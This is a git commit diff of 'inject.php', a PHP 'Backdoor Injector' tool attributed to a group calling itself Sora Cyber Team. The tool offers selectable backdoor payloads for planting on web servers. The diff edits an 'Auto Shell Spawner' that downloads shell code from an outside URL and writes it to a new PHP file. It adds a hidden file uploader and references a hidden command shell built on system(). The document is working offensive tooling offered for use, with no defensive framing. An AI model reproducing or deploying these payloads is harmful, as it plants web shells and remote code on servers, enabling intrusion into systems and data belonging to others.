226c71bffcf1bebdcbe8592b6e4d8c7a101dcb53
Sora Cyber Team <39432557+soracyberteam@users.noreply.github.com>
2018-12-22 19:24:31 -0500

    Backdoor Injector v2.5

--- inject.php
+++ inject.php
@@ -1,6 +1,6 @@
 <?php
 /*
-        PHP Backdoor Injector v.2.0
+        PHP Backdoor Injector v.2.5
     @Author : 74nc0x
     @Github : http://github.com/soracyberteam/
     @Date   : 22/Dec/2018
@@ -55,21 +55,31 @@ system($x);
 ?>';
 }elseif($_POST['payload']=="3"){
 $ex='<?php
-$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell Mu Cok!
+/* Shell -> 74nc0x.php */
+$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
 $fu=file_get_contents("$cok");
 $fh=fopen(\'74nc0x.php\',w);
 fwrite($fh,"$fu");
 fclose($fh);
 ?>';
+}elseif($_POST['payload']=="4"){
+$ex='<?php
+/* POST file = 74nc0x */
+$cwd=getcwd();
+$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
+$filena=$_FILES[\'74nc0x\'][\'name\'];
+if(@copy($tmp, $filena)){
+  echo "<br>Sukses -> $cwd/$filena";
 }
-$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2</title>
-<center><body bgcolor='black'><pre>
+?>';}
+$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
+<center><body bgcolor='grey'><pre>
 <font color='white' size='4'>
-<font color='red'>[</font> PHP Backdoor Injector v2 <font color='red'>]</font>
+<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
 <form action='' method='POST'>
 Code To Inject
 
-<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option></select> <input type='submit' name='lockp' value='Lock'>
+<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>
 
 <textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>
 
